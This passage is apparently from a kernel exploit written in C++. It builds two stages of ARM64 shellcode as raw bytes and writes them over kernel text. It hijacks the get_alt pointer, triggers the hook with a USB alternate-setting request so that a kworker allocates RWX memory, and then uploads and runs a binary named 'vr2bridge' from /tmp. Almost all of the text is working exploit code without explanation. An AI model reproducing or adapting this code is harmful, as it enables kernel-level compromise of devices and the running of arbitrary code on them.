            0xFD, 0x7B, 0xC1, 0xA8,  // 0x38: LDP X29, X30, [SP], #0x10
            0xC0, 0x03, 0x5F, 0xD6,  // 0x3C: RET
            0x1F, 0x20, 0x03, 0xD5,  // 0x40: NOP (Align)
            0x1F, 0x20, 0x03, 0xD5   // 0x44: NOP (Align)
        };
        pack_q(stage2_sc, __vmalloc_addr);    // 0x48
        pack_q(stage2_sc, addr_alloc_ptr);    // 0x50
        pack_q(stage2_sc, addr_debug_flag);   // 0x58
        payload.insert(payload.end(), stage2_sc.begin(), stage2_sc.end());

        uint64_t WORK_STRUCT_NO_POOL = 0x0FFFFFFFE0; 
        uint64_t entry_addr = addr_work_struct + 0x08; 
        pack_q(payload, WORK_STRUCT_NO_POOL); // 0x60
        pack_q(payload, entry_addr);          // 0x68
        pack_q(payload, entry_addr);          // 0x70
        pack_q(payload, addr_worker);         // 0x78

        std::vector<uint8_t> stage1_sc = {
            0xFD, 0x7B, 0xBF, 0xA9,  // 0x00: STP X29, X30, [SP, #-0x10]!
            
            // Flush Cache Line 1, 2 & 3
            0xA4, 0x02, 0x00, 0x58,  // 0x04: LDR X4, pc+84 (Loads addr_worker from 0xD8)
            0x24, 0x7B, 0x0B, 0xD5,  // 0x08: DC CVAU, X4
            0x24, 0x75, 0x0B, 0xD5,  // 0x0C: IC IVAU, X4
            0x84, 0x00, 0x01, 0x91,  // 0x10: ADD X4, X4, #64
            0x24, 0x7B, 0x0B, 0xD5,  // 0x14: DC CVAU, X4
            0x24, 0x75, 0x0B, 0xD5,  // 0x18: IC IVAU, X4
            0x84, 0x00, 0x01, 0x91,  // 0x1C: ADD X4, X4, #64
            0x24, 0x7B, 0x0B, 0xD5,  // 0x20: DC CVAU, X4
            0x24, 0x75, 0x0B, 0xD5,  // 0x24: IC IVAU, X4
            0x9F, 0x3B, 0x03, 0xD5,  // 0x28: DSB ISH
            0xDF, 0x3F, 0x03, 0xD5,  // 0x2C: ISB
            
            0x80, 0x00, 0x80, 0x52,  // 0x30: MOV W0, #4 (WORK_CPU_UNBOUND)
            0x61, 0x01, 0x00, 0x58,  // 0x34: LDR X1, pc+44 (Loads SYSTEM_WQ from 0xE0)
            0x21, 0x00, 0x40, 0xF9,  // 0x38: LDR X1, [X1]  (Deref system_wq)
            0x62, 0x01, 0x00, 0x58,  // 0x3C: LDR X2, pc+44 (Loads addr_work_struct from 0xE8)
            0x83, 0x01, 0x00, 0x58,  // 0x40: LDR X3, pc+48 (Loads QUEUE_WORK_ON from 0xF0)
            0x60, 0x00, 0x3F, 0xD6,  // 0x44: BLR X3 
            0x00, 0x00, 0x80, 0xD2,  // 0x48: MOV X0, #0
            0xFD, 0x7B, 0xC1, 0xA8,  // 0x4C: LDP X29, X30, [SP], #0x10
            0xC0, 0x03, 0x5F, 0xD6,  // 0x50: RET
            0x1F, 0x20, 0x03, 0xD5   // 0x54: NOP (Align)
        };
        pack_q(stage1_sc, addr_worker);              // 0x58 -> 0xD8
        pack_q(stage1_sc, constants::SYSTEM_WQ);     // 0x60 -> 0xE0
        pack_q(stage1_sc, addr_work_struct);         // 0x68 -> 0xE8
        pack_q(stage1_sc, constants::QUEUE_WORK_ON); // 0x70 -> 0xF0
        payload.insert(payload.end(), stage1_sc.begin(), stage1_sc.end());

        LOG_DEBUG << "[*] Writing unified payload (0x" << std::hex << payload.size() << " bytes)...\n";
        if (!write_data_fast(constants::TEXT_DATA, payload)) return false;

        LOG_DEBUG << "[*] Hijacking get_alt to point to IRQ trigger...\n";
        write_u64_fast(get_alt_ptr_addr, addr_irq);

        LOG_DEBUG << "[*] Triggering USB alternate setting request...\n";
        usb->trigger_get_alt();

        LOG_DEBUG << "[*] Waiting for kworker to provision 256KB RWX memory...\n";

        uint64_t debug_flag = 0;

        for (int i = 0; i < 10; i++) {
            std::this_thread::sleep_for(std::chrono::milliseconds(10));

            debug_flag = read_ptr(addr_debug_flag);
            rwx_base = read_ptr(addr_alloc_ptr);

            if (debug_flag == 0x1337) {
                break;
            }
        }
        
        if (debug_flag == 0x1337 && rwx_base != 0) {
            LOG_DEBUG << "[+] 256KB RWX Buffer natively allocated at: 0x" << std::hex << rwx_base << "\n";
            patch_rwx(rwx_base, 0x40000);
            execute_tlb_flush();

            write_u64_fast(constants::TEXT_ALLOC_BASE, rwx_base);
            
            // Upload and execute vr2bridge
            upload_to_tmp("./vr2bridge", "vr2bridge");
            execute_elf("/tmp/vr2bridge", {});

            return true;
        } else {
            LOG_ERROR << "[-] Allocation failed. Debug: 0x" << std::hex << debug_flag << ", Ptr: 0x" << std::hex << rwx_base << "\n";
            return false;
        }
    }

    return true;
}